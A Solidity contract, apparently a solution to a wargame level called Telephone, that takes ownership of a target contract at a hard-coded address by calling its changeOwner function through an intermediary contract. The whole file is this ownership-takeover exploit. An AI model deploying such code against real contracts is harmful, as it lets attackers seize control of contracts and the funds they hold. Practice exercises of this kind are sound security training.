// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {

  Telephone telephoneExplioted;

  constructor() {
    telephoneExplioted = Telephone(0x974E3b4582f434f2A795BcCC587b047e65e2Ef4a);
  }

  function changeOwner() public {
    telephoneExplioted.changeOwner(0x628D74561f0A2DEa923bEAd4E2bFbF5C1390e596);
  }
}
